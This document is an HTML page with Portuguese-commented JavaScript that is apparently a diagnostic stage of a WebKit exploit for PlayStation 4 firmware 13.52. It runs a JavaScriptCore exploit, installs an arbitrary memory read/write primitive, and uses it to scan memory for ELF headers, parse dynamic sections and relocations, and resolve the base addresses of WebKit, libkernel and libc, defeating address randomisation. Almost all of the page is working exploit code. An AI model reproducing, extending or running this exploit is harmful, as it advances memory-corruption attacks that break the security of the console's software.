<style>

<body>

<h1>PS4 WebKit Exploit (13.52 — Diagnóstico)</h1>
<div id="fw">detectando...</div>

<div id="sb">
  <div id="dot" class="r"></div>
  <div id="st">Inicializando...</div>
</div>
<div id="bars">
  <span id="ba">tentativa: 1</span>
  <span id="bg">estágio: init</span>
</div>

<div id="con"></div>

<div id="cards">
  <div class="card"><div class="cl">WebKit Base</div><div class="cv na" id="c-wk">—</div></div>
  <div class="card"><div class="cl">libkernel Base</div><div class="cv na" id="c-lk">—</div></div>
  <div class="card"><div class="cl">libSceLibc Base</div><div class="cv na" id="c-lc">—</div></div>
  <div class="card"><div class="cl">Diagnóstico</div><div class="cv na" id="c-g">Aguardando</div></div>
</div>

  <div class="ct">// ═══════ DIAGNÓSTICO COMPLETO (13.52) ═══════</div>
  <div id="c-out"></div>

<script src="./13.52.js?v=1"></script>

<script type="module">
import { int64 }              from './resources/int64.js';
import { establishPrimitive } from './resources/core.js?v=10';
import { installWindowP }     from './resources/mem.js';
globalThis.int64 = int64;

const $con = document.getElementById('con');
const $dot = document.getElementById('dot');
const $st  = document.getElementById('st');
const $fw  = document.getElementById('fw');

function log(m, c='i') {
  const d = document.createElement('div');
  d.className = c; d.textContent = m;
  $con.appendChild(d);
  $con.scrollTop = $con.scrollHeight;
  while ($con.children.length > 800) $con.removeChild($con.firstChild);
}
function logH(m) { log('=== ' + m + ' ===', 's'); }
function setStatus(m, s='r') { $st.textContent = m; $dot.className = s; }
function setCard(id, v) {
  const el = document.getElementById(id);
  if (!el) return;
  el.textContent = v; el.classList.remove('na');
}

// Helper: subtrair de int64 de forma segura
function int64Sub(a, val) {
  let lo = a.low - val;
  let hi = a.hi;
  if (lo < 0) {
    lo += 0x100000000;
    hi -= 1;
  }
  return new int64(lo >>> 0, hi >>> 0);
}

// ═════════════════════════════════════════════════════════════════════════════
// DIAGNÓSTICO: Analisar __ps5NativeCtor SEM scanear memória arbitrária
// ═════════════════════════════════════════════════════════════════════════════

async function diagnoseCtor(p, ctorAddr) {
  logH('DIAGNÓSTICO DO __ps5NativeCtor');
  log('[dbg] __ps5NativeCtor = 0x' + ctorAddr.toString(16));

  // ─── Teste 1: O que há em __ps5NativeCtor? ───
  let qword0 = null, qword8 = null, byte0 = null;
  try {
    qword0 = p.read8(ctorAddr);
    log('[+] read8(ctor) = 0x' + qword0.toString(16), 'ok');
  } catch(e) {
    log('[-] read8(ctor) falhou: ' + e.message, 'e');
  }

  try {
    qword8 = p.read8(ctorAddr.add32(8));
    log('[+] read8(ctor+8) = 0x' + qword8.toString(16), 'ok');
  } catch(e) {
    log('[-] read8(ctor+8) falhou: ' + e.message, 'e');
  }

  try {
    byte0 = p.read1(ctorAddr);
    log('[+] read1(ctor) = 0x' + byte0.toString(16), 'ok');
  } catch(e) {
    log('[-] read1(ctor) falhou: ' + e.message, 'e');
  }

  // ─── Teste 2: Análise heurística ───
  if (qword0) {
    let isVtable = (qword0.hi >= 0x80 && qword0.hi <= 0x9F && (qword0.low & 0xF) === 0);
    log('[dbg] qword0 parece vtable? ' + isVtable);

    if (isVtable) {
      log('[!] __ps5NativeCtor parece apontar para um OBJETO C++ (vtable no início)');
      log('[!] A vtable está em: 0x' + qword0.toString(16));
      log('[!] Tentando encontrar ELF a partir da vtable (máx 256 tentativas)...');

      let found = false;
      for (let back = 0; back < 0x400000 && !found; back += 0x1000) {
        try {
          let testAddr = int64Sub(qword0, back);
          let magic = p.read4(testAddr);
          if (magic === 0x464C457F) {
            log('[+] ELF magic em: 0x' + testAddr.toString(16) +
                ' (-0x' + back.toString(16) + ' da vtable)', 'ok');
            setCard('c-wk', '0x' + testAddr.toString(16));
            found = true;
            await tryParseElfMinimal(p, testAddr);
            break;
          }
        } catch(e) {
          log('[-] Segfault no scan da vtable em back=0x' + back.toString(16) + '. Parando.', 'e');
          break;
        }
      }
      if (!found) {
        log('[-] ELF não encontrado próximo à vtable', 'w');
      }
    } else {
      log('[!] __ps5NativeCtor NÃO parece um objeto C++ com vtable');
      if (byte0 !== null) {
        if (byte0 === 0x55) log('[!] byte0 = 0x55 (push rbp) → CÓDIGO x86_64 / JIT');
        else if (byte0 === 0x48) log('[!] byte0 = 0x48 (REX.W) → CÓDIGO x86_64 / JIT');
        else if (byte0 === 0xE9) log('[!] byte0 = 0xE9 (jmp rel) → CÓDIGO x86_64 / JIT');
        else if (byte0 === 0x41) log('[!] byte0 = 0x41 (REX.B) → CÓDIGO x86_64 / JIT');
        else log('[!] byte0 = 0x' + byte0.toString(16) + ' → possível CÓDIGO');
      }
      log('[!] __ps5NativeCtor aponta para CÓDIGO, não para um objeto.');
      log('[!] A base do módulo NÃO pode ser derivada de ctor - offset_fixo.');
    }
  }

  // ─── Teste 3: Verificar approxBase (ctor - hc) ───
  const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
             ? OFFSET_wk_host_constructor_candidates[0]
             : 0x36F9E20;
  const approxVal = ctorAddr.hi * 0x100000000 + ctorAddr.low - hc;
  const approxHi = Math.floor(approxVal / 0x100000000);
  const approxLo = approxVal - approxHi * 0x100000000;
  const approxBase = new int64(approxLo >>> 0, approxHi >>> 0);

  log('[dbg] approxBase = ctor - 0x' + hc.toString(16) + ' = 0x' + approxBase.toString(16));

  try {
    let magic = p.read4(approxBase);
    if (magic === 0x464C457F) {
      log('[+] approxBase É ELF válido!', 'ok');
      setCard('c-wk', '0x' + approxBase.toString(16));
      await tryParseElfMinimal(p, approxBase);
    } else {
      log('[-] approxBase NÃO é ELF (magic=0x' + magic.toString(16) + ')', 'w');
      log('[!] O offset host_constructor_candidates está ERRADO para PS4 13.52');
    }
  } catch(e) {
    log('[-] approxBase causou erro: ' + e.message, 'e');
    log('[!] O offset host_constructor_candidates está ERRADO para PS4 13.52');
  }
}

// ─── Parse ELF mínimo ───
async function tryParseElfMinimal(p, base) {
  logH('PARSE ELF MÍNIMO');
  try {
    let e_phoff = p.read8(base.add32(0x20));
    let e_phnum = p.read2(base.add32(0x38));
    log('[dbg] e_phoff=0x' + e_phoff.toString(16) + ' e_phnum=' + e_phnum);

    if (e_phnum === 0 || e_phnum > 64) {
      log('[-] e_phnum inválido', 'w');
      return;
    }

    let phoff = base.add32(e_phoff.low);
    let hasDynamic = false;

    for (let i = 0; i < e_phnum && i < 64; i++) {
      let phAddr = phoff.add32(i * 0x38);
      let p_type = p.read4(phAddr);
      if (p_type === 2) {
        let p_vaddr = p.read8(phAddr.add32(0x10));
        let p_filesz = p.read8(phAddr.add32(0x28));
        log('[+] PT_DYNAMIC: vaddr=0x' + p_vaddr.toString(16) +
            ' filesz=0x' + p_filesz.toString(16), 'ok');
        hasDynamic = true;
        let dynAbs = base.add32(p_vaddr.low);
        await tryReadDynamic(p, dynAbs, p_filesz.low, base);
        break;
      }
    }
    if (!hasDynamic) log('[-] Sem PT_DYNAMIC', 'w');
  } catch(e) {
    log('[-] Erro no parse: ' + e.message, 'e');
  }
}

// ─── Ler dynamic section ───
async function tryReadDynamic(p, dynAbs, dynSize, base) {
  log('[dbg] Lendo dynamic section...');
  let strtab = null, symtab = null, jmprel = null, pltrelsz = 0;
  let entries = 0;

  for (let off = 0; off < dynSize && entries < 256; off += 16) {
    let entry = dynAbs.add32(off);
    let tag = p.read8(entry).low;
    let val = p.read8(entry.add32(8));
    entries++;
    if (tag === 5) strtab = base.add32(val.low);
    if (tag === 6) symtab = base.add32(val.low);
    if (tag === 23) jmprel = base.add32(val.low);
    if (tag === 2) pltrelsz = val.low;
    if (tag === 0) break;
  }

  log('[dbg] strtab=0x' + (strtab ? strtab.toString(16) : 'null') +
      ' symtab=0x' + (symtab ? symtab.toString(16) : 'null') +
      ' jmprel=0x' + (jmprel ? jmprel.toString(16) : 'null') +
      ' pltrelsz=' + pltrelsz);

  if (!strtab || !symtab || !jmprel || pltrelsz === 0) {
    log('[-] Dynamic incompleta', 'w');
    return;
  }

  let numRela = Math.floor(pltrelsz / 24);
  if (numRela > 5000) numRela = 5000;
  log('[+] Varrendo ' + numRela + ' entradas RELA...');

  let imports = {};
  for (let i = 0; i < numRela; i++) {
    let rela = jmprel.add32(i * 24);
    let r_offset = p.read8(rela);
    let r_info = p.read8(rela.add32(8)).low;
    let symIdx = (r_info >>> 32) & 0xFFFFFFFF;

    let st_name = p.read4(symtab.add32(symIdx * 24));
    let strAddr = strtab.add32(st_name);

    let name = '';
    for (let j = 0; j < 128; j++) {
      let ch = p.read1(strAddr.add32(j));
      if (ch === 0) break;
      name += String.fromCharCode(ch);
    }

    if (name.length > 0) {
      let importPtr = p.read8(base.add32(r_offset.low));
      imports[name] = { wkOffset: r_offset, importPtr: importPtr };
    }
  }

  log('[+] ' + Object.keys(imports).length + ' imports');

  let useful = ['memset','__stack_chk_guard','sceKernelSendNotificationRequest','sceKernelGetpid'];
  for (let name of useful) {
    if (imports[name]) {
      let ip = imports[name].importPtr;
      log('    ' + name + ': off=0x' + imports[name].wkOffset.toString(16) +
          ' ptr=0x' + ip.toString(16), 'd');
    }
  }

  resolveFromImports(p, imports);
}

// ─── Resolver bases ───
function resolveFromImports(p, imports) {
  logH('RESOLVENDO BASES');

  function findBase(p, ptr) {
    if (!ptr || ptr.hi < 0x80 || ptr.hi > 0x9F) return null;
    for (let back = 0; back < 0x200000; back += 0x1000) {
      try {
        let test = int64Sub(ptr, back);
        if (p.read4(test) === 0x464C457F) return test;
      } catch(e) {
        return null;
      }
    }
    return null;
  }

  let lkRef = imports['__stack_chk_guard'] || imports['sceKernelGetpid'];
  if (lkRef) {
    let base = findBase(p, lkRef.importPtr);
    if (base) {
      log('[+] libkernel: 0x' + base.toString(16), 'ok');
      setCard('c-lk', '0x' + base.toString(16));
    } else {
      log('[-] libkernel: não encontrada', 'w');
    }
  }

  if (imports['memset']) {
    let base = findBase(p, imports['memset'].importPtr);
    if (base) {
      log('[+] libc: 0x' + base.toString(16), 'ok');
      setCard('c-lc', '0x' + base.toString(16));
    } else {
      log('[-] libc: não encontrada', 'w');
    }
  }
}

// ═════════════════════════════════════════════════════════════════════════════
// MAIN
// ═════════════════════════════════════════════════════════════════════════════

async function main() {
  const ua = navigator.userAgent;
  const fw = /PlayStation 4\/(\d+\.\d+)/.exec(ua);
  $fw.textContent = fw ? `PlayStation 4 — firmware ${fw[1]}` : `UA: ${ua.slice(0, 40)}`;
  log('UA: ' + ua, 'd');

  setStatus('Rodando exploit JSC...', 'r');
  logH('EXPLOIT JSC (WebKit)');

  let carrier;
  try {
    carrier = await establishPrimitive({
      onEvent: (tag, detail, attempt) => {
        document.getElementById('ba').textContent = 'tentativa: ' + (attempt || 1);
        document.getElementById('bg').textContent = 'estágio: ' + tag.toLowerCase();
        log(`[${tag}] ${detail}`, 'i');
      },
      maxAttempts: 0
    });
  } catch (err) {
    setStatus('core.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] core.js: OK!', 'ok');
  setStatus('Instalando R/W...', 'r');
  logH('INSTALANDO PRIMITIVA R/W (mem.js)');

  let p;
  try {
    p = installWindowP(carrier, {
      promote: true,
      onEvent: (tag, detail) => {
        log(`  [mem/${tag}] ${detail}`, 'd');
      }
    });
  } catch (err) {
    setStatus('mem.js falhou: ' + err.message, 'e');
    log('[ERRO] ' + err.message, 'e');
    return;
  }

  log('[+] R/W instalado!', 'ok');
  setStatus('Diagnosticando...', 'r');
  logH('DIAGNÓSTICO 13.52 (v6)');

  const ctor = globalThis.__ps5NativeCtor;
  if (typeof ctor === 'number' && ctor > 0x100000000) {
    const hi = Math.floor(ctor / 0x100000000);
    const lo = ctor - hi * 0x100000000;
    const ctorInt64 = new int64(lo >>> 0, hi >>> 0);

    log('[+] __ps5NativeCtor: 0x' + ctorInt64.toString(16), 'a');

    // Diagnóstico direto — sem setTimeout, sem scan arbitrário
    await diagnoseCtor(p, ctorInt64);

    setStatus('Diagnóstico concluído', 'ok');
    setCard('c-g', 'Ver console');

    // Mostrar resumo
    const cbox = document.getElementById('cbox');
    cbox.style.display = 'block';
    document.getElementById('c-out').textContent =
      'Análise do __ps5NativeCtor concluída.\n' +
      'Verifique o console acima para os resultados.\n\n' +
      'Se approxBase NÃO for ELF válido, o offset\n' +
      'host_constructor_candidates (0x36F9E20) está incorreto\n' +
      'para o PS4 13.52. Você precisa do dump do WebKit\n' +
      'para extrair o offset correto.';

  } else {
    log('[-] __ps5NativeCtor inválido.', 'e');
    setStatus('Erro NativeCtor', 'e');
  }
}

main();
</script>
